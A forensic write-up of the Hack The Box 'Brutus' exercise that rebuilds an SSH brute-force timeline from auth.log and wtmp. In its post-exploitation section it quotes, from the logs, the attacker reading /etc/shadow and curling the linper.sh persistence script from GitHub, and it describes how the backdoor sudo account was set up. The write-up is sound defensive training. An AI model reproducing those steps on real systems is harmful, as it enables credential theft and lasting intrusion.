---
title: 'Brutus'
target: 'Hack The Box — Brutus'
difficulty: 'easy'
date: 2026-01-25
summary: 'An HTB Sherlock — auth.log and wtmp forensics from a compromised Confluence server. Reconstructed an SSH brute-force from 65.2.161.68 that cracked root, identified session 37, traced persistence via cyberjunkie account creation (T1136.001) with sudo privileges, and found post-exploitation curl download of linper.sh.'
role: 'soc'
tags: ['auth-log', 'wtmp', 'ssh', 'brute-force', 'log-analysis', 'dfir', 'linux-forensics', 'grep', 'last', 'session-tracking', 'persistence', 'account-creation', 'mitre-attack', 'privilege-escalation', 'sudo', 'timeline-analysis', 'confluence', 'sherlock']
problem: 'Two forensic artifacts (auth.log and wtmp) from a Confluence server compromised via SSH brute-force. The investigation requires identifying the attacker IP, compromised account, session correlation between logs, persistence mechanisms, MITRE ATT&CK mapping, and post-exploitation command tracking.'
action: 'Reviewed auth.log baseline — Confluence server (uid=998 cron jobs) on ip-172-31-35-28. Identified brute-force burst at 06:31:31 from 65.2.161.68, cycling through admin, svc_account, root, and backup with sequential source ports. Grepped "Accepted password" — attacker authenticated as root at 06:31:40 and 06:32:44. Correlated with wtmp via last -f to pinpoint interactive session at 06:32:45 (session 37). Traced post-exploitation via grep cyberjunkie — account created at 06:34:18 (UID 1002), added to sudo group at 06:35:15, SSH login at 06:37:34 (session 49), sudo cat /etc/shadow at 06:37:57, sudo curl of linper.sh at 06:39:38. Mapped to T1136.001. Root session ended at 06:37:24.'
outcome: 'Full timeline reconstructed: brute-force at 06:31:31, root compromise at 06:31:40, session 37 at 06:32:45, cyberjunkie persistence account with sudo at 06:34-06:35, session end at 06:37:24, re-login as cyberjunkie and linper.sh download at 06:39:38.'
draft: false
---

## Background

Brutus is a Hack The Box Sherlock — a guided DFIR investigation where the goal is to reconstruct an attack timeline from forensic artifacts rather than compromise a machine. The scenario involves a Confluence server that was hit by an SSH brute-force attack, and the evidence comes in the form of two Linux log files: `auth.log` and `wtmp`. These are two of the most fundamental artifacts in Linux forensics — `auth.log` records every authentication event including SSH logins, sudo usage, and account management, while `wtmp` is a binary log that tracks interactive session lifecycle. Together they tell the full story: who connected, when they got in, what they did with their access, and how they tried to stay.

---

## Artifacts and initial review

The investigation begins with two files extracted from `Brutus.zip`:

**auth.log** is a text-based log file primarily used for tracking authentication mechanisms. Whenever a user attempts to log in, switches users, or performs any task requiring authentication, an entry is written here. This includes `sshd` (SSH daemon) events, `sudo` actions, `pam_unix` session management, and `cron` job authentication. Each line carries a timestamp, hostname, service name with PID, and a human-readable message.

**wtmp** is a binary file typically located at `/var/log/wtmp` that logs all login and logout events on the system. It can't be read directly with `cat` or `less` — the `last` command decodes it into a readable format, providing a history of user logins and logouts, system reboots, and runlevel changes. Where `auth.log` records the authentication moment, `wtmp` records the session boundary — when the terminal was actually allocated and when it was released.

Opening `auth.log` and scrolling through the early entries reveals the system's baseline activity. The hostname is `ip-172-31-35-28` (an AWS-style internal hostname), and regular `CRON` session entries cycle for user **confluence** (uid=998), confirming this is a Confluence server. The log is dated March 6, and for the first several minutes everything looks normal — scheduled tasks opening and closing sessions at regular intervals. Then, at 06:31:31, the pattern breaks completely.

---

## Identifying the brute-force attack

The transition from normal operations to active attack is abrupt. At 06:31:31, the log fills with SSH authentication failures arriving in rapid succession:

![Terminal showing auth.log entries on host ip-172-31-35-28. The first section shows normal CRON session activity for user confluence cycling open and closed from 06:28:01 through 06:31:31. At 06:31:31, the pattern breaks — sshd[2325] logs "Invalid user admin from 65.2.161.68 port 46380" highlighted in white, followed immediately by disconnect, MaxStartups throttling errors dropping connection #10 from 65.2.161.68 on port 22, more "Invalid user admin" entries on ports 46392, 46444, and 46436, with pam_unix check pass failures noting "user unknown" and authentication failure with logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68.](/writeups/htb-brutus/01-auth-log-brute-start.png)

The entries tell a clear story. Multiple SSH login attempts from **65.2.161.68** hit the server within the same second, all trying the username **admin** — which doesn't exist on this system, hence "Invalid user." The connections arrive on sequential source ports (46380, 46392, 46436, 46444), a hallmark of automated tooling cycling through connections. The server's `MaxStartups` throttling kicks in, dropping connections because the SSH daemon is being overwhelmed. The `pam_unix` entries confirm "user unknown" and "authentication failure" for each attempt.

The attacker doesn't stop at **admin**. Scrolling forward reveals the brute-force cycling through multiple usernames:

![Terminal showing auth.log entries with "Failed password" highlighted in red across every line. All attempts originate from 65.2.161.68. The first block shows failed passwords for invalid user svc_account on ports 46732 through 46854, roughly ten attempts within one second at 06:31:38-39. The next block shows failed passwords for root on ports 46852 through 46890 at 06:31:39-41. The final entries show failed passwords for backup on ports 34834 and 34856 at 06:31:42. Source ports increment sequentially across all attempts.](/writeups/htb-brutus/02-failed-passwords.png)

The attack progresses through **svc_account** (an invalid user, generating about ten failures in one second), then pivots to **root** (a valid user, explaining why the error message changes from "invalid user" to just "Failed password"), and then tries **backup**. The sequential port numbers and sub-second timing across all of these confirm this is automated credential stuffing — likely a tool like Hydra or Medusa working through a username list with a password dictionary.

---

## Successful authentication

The brute-force succeeded. Filtering `auth.log` for successful logins reveals exactly which account was compromised:

```
cat auth.log | grep 'Accepted password'
```

![Terminal showing the grep results. Four lines of accepted passwords: (1) Mar 6 06:19:54 — Accepted password for root from 203.101.190.9 port 42825 ssh2, with "root" highlighted in a white box, (2) Mar 6 06:31:40 — Accepted password for root from 65.2.161.68 port 34782 ssh2, (3) Mar 6 06:32:44 — Accepted password for root from 65.2.161.68 port 53184 ssh2, (4) Mar 6 06:37:34 — Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2.](/writeups/htb-brutus/03-accepted-passwords.png)

Four successful authentications total. The first — **root** from **203.101.190.9** at 06:19:54 — predates the brute-force by over ten minutes and comes from a different IP, making it the legitimate administrator's session. The second and third are **root** from **65.2.161.68** at 06:31:40 and 06:32:44 — the attacker. The brute-force started at 06:31:31 and cracked the root password within nine seconds. The fourth entry at 06:37:34 shows a login as **cyberjunkie** from the same attacker IP — a username that didn't exist before the attack, which means the attacker created it as a persistence mechanism.

---

## Establishing the session timeline

There's an important distinction between authentication time and session time. The `auth.log` records when the password was accepted, but the actual interactive terminal session may start slightly later. The `wtmp` artifact captures this session-level detail. Since `wtmp` is binary, the `last` command decodes it:

```
sudo last -f ./wtmp -F
```

![Terminal showing decoded wtmp output with columns for session number, PID, user, terminal, source IP, and full timestamp. Entries include: ttyS0 LOGIN sessions at 2024-03-06T06:17:27, tty1 LOGIN sessions at the same time, a runlevel entry for kernel 6.2.0-1018-aws at 06:17:29, root on pts/0 from 203.101.190.9 at 2024-03-06T06:19:55, root on pts/1 from 65.2.161.68 at 2024-03-06T06:32:45 highlighted with a yellow/orange background, a root entry on pts/1 at 06:37:24, and a cyberjunkie entry beginning at 2024-03-06T06:37:35. PIDs visible include 01583, 02549, 02491, and 02667.](/writeups/htb-brutus/04-wtmp-sessions.png)

The `wtmp` output reveals the session-level picture. The legitimate root session from 203.101.190.9 started at 06:19:55 on `pts/0`. The attacker's interactive session from 65.2.161.68 began at **2024-03-06 06:32:45** on `pts/1` — this is one second after the second `Accepted password` entry at 06:32:44, confirming this was the manual login where the attacker established their working terminal. The earlier authentication at 06:31:40 was likely an automated check by the brute-force tool to verify the credentials worked before the attacker logged in manually. The cyberjunkie session appears at 06:37:35, matching the fourth accepted password entry.

---

## Session tracking

SSH sessions are assigned sequential numbers by `systemd-logind`. To identify the exact session number for the attacker's interactive login, filtering `auth.log` around the 06:32:44 timestamp:

```
cat auth.log | grep '06:32:4'
```

![Terminal showing three log entries all timestamped Mar 6 06:32:44 on ip-172-31-35-28. First: sshd[2491] — "Accepted password for root from 65.2.161.68 port 53184 ssh2". Second: sshd[2491] — "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)". Third: systemd-logind[411] — "New session 37 of user root." All three entries share the same second, showing the authentication-to-session pipeline.](/writeups/htb-brutus/05-session-37.png)

Three entries within the same second tell the complete authentication-to-session pipeline: `sshd` accepts the password, `pam_unix` opens the session, and `systemd-logind` assigns **session 37** to the new root login. This session number ties all subsequent activity back to the attacker's interactive terminal. The legitimate administrator's earlier session from 203.101.190.9 would have been assigned a lower session number, making it straightforward to separate the two root sessions in the log.

---

## Post-exploitation — persistence and privilege escalation

With root access through session 37, the attacker moved quickly to establish persistence. Filtering `auth.log` for the username **cyberjunkie** reveals the complete chain of post-exploitation activity:

```
cat auth.log | grep cyberjunkie
```

![Terminal showing auth.log entries filtered for cyberjunkie. The sequence begins at Mar 6 06:34:18 with groupadd[2586] creating group cyberjunkie (GID=1002) in /etc/group and /etc/gshadow. At 06:34:18, useradd[2592] creates user cyberjunkie with UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1. At 06:34:26, passwd[2603] records pam_unix(passwd:chauthtok) password changed for cyberjunkie. At 06:34:31, chfn[2605] changed user cyberjunkie information. At 06:35:15, usermod[2628] adds cyberjunkie to group sudo, then to shadow group sudo. At 06:37:34, sshd[2667] records Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2, followed by pam_unix session opened for cyberjunkie(uid=1002). systemd-logind creates New session 49. At 06:37:57, sudo logs cyberjunkie executing /usr/bin/cat /etc/shadow as USER=root from PWD=/home/cyberjunkie on TTY=pts/1. At 06:39:38, sudo logs cyberjunkie executing /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh as USER=root, followed by another pam_unix session opened.](/writeups/htb-brutus/06-cyberjunkie-persistence.png)

The timeline of post-exploitation reads like a textbook persistence playbook:

**06:34:18** — `groupadd` creates the **cyberjunkie** group with GID 1002, followed immediately by `useradd` creating user **cyberjunkie** with UID 1002, home directory `/home/cyberjunkie`, and shell `/bin/bash`. The `from=/dev/pts/1` confirms this was executed from the attacker's terminal session.

**06:34:26** — `passwd` changes the password for cyberjunkie via `pam_unix(passwd:chauthtok)`.

**06:34:31** — `chfn` updates the user's GECOS information (full name, room number, phone, etc.).

**06:35:15** — `usermod` adds cyberjunkie to the **sudo** group and the **shadow** group — this is the privilege escalation step. Adding a user to the sudo group grants them the ability to execute any command as root through `sudo`, effectively making cyberjunkie a full administrator.

**06:37:34** — The attacker logs in via SSH as cyberjunkie from 65.2.161.68, receiving session 49. This is the first use of the persistence account.

**06:37:57** — The first sudo command: `/usr/bin/cat /etc/shadow` — reading the shadow password file to harvest password hashes for all users on the system.

**06:39:38** — The second sudo command: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` — downloading a Linux persistence script from GitHub. **linper** is a post-exploitation tool designed to establish multiple persistence mechanisms on a compromised Linux host.

In the MITRE ATT&CK framework, creating a local account for persistence maps to sub-technique **T1136.001** (Create Account: Local Account) under the Persistence tactic. The attacker's approach is methodical — create the account, set a password, elevate its privileges, then use it as a fallback access path independent of the original compromised root credentials.

The attacker's first root SSH session (session 37) ended at **2024-03-06 06:37:24**, visible in the session-closed entries in `auth.log`. The attacker spent roughly five minutes in the root session — enough time to create the persistence account, assign privileges, and prepare the handoff. Ten seconds later, they logged back in through the new cyberjunkie account to continue their operations under a less conspicuous username.

---

## What I took from this

Brutus is a clean introduction to Linux log forensics, and the value is in understanding what each artifact records and where its blind spots are. `auth.log` captures the authentication event — who tried to log in, whether it succeeded, and from where — along with account management operations and sudo command execution. `wtmp` captures the session lifecycle — when an interactive terminal was actually allocated and released. Neither one tells the complete story alone. The authentication timestamp in `auth.log` (06:32:44) and the session start in `wtmp` (06:32:45) differ by one second, and understanding why that difference exists matters: `auth.log` records when the password was validated, while `wtmp` records when the terminal was allocated to the user. In an investigation, mixing up authentication time with session start time can throw off an entire timeline.

The brute-force pattern is textbook — rapid-fire attempts from a single IP, sequential source ports, cycling through multiple usernames, all within seconds. What makes it significant from a defensive perspective is how fast it succeeded. The root password was cracked within nine seconds of the first attempt, which suggests it was either in a common password dictionary or was relatively weak. Rate limiting through `MaxStartups` throttling kicked in but didn't prevent the compromise — it slowed the connection rate but didn't block the source IP. Tools like `fail2ban` or firewall rules that ban an IP after a threshold of failures would have stopped this attack before it succeeded.

The post-exploitation timeline is equally instructive. The attacker's first actions after gaining root were not to exfiltrate data or deploy malware — they were to create a persistence account with sudo privileges. This is a common pattern because the initial access vector (the brute-forced root password) could be remediated at any time by changing the password, but a new local account with its own credentials provides an independent access path that survives a password rotation. The addition to the sudo group is the critical step — without it, the cyberjunkie account would be a standard user with limited value. By adding it to sudo, the attacker ensured that even their backup account had full administrative capabilities.

One of the investigation's strengths is demonstrating what `auth.log` does and doesn't record. It captures sudo commands because sudo itself logs to the auth facility, which is why the `curl` command downloading `linper.sh` appears in the log. But it does not capture general command history — anything the attacker ran without `sudo` during their root session (session 37) is invisible in these artifacts. If the attacker ran reconnaissance commands, read files, or modified configurations directly as root without going through `sudo`, those actions wouldn't appear in `auth.log`. Capturing those would require additional logging — `auditd` rules, process accounting, or shell history files — which is why a defence-in-depth logging strategy matters for forensic completeness.
